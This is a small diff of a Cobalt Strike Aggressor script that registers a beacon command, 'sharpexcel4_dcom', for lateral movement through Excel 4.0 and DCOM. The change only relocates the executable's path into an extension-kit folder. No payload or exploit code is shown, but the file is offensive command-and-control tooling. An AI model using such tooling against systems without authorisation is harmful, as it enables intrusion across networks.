@@ -4,7 +4,7 @@ beacon_command_register("sharpexcel4_dcom", "Lateral movement using Excel 4.0 / 
 alias sharpexcel4_dcom{
 	local('$bid $asm $desc @args $argu');
 	$bid = $1;
-	$asm = "/opt/exe/SharpExcel4-DCOM.exe";
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpExcel4-DCOM.exe";
 	$desc = "SharpExcel4-DCOM";
 	@args = @_;
 	remove(@args, $bid);
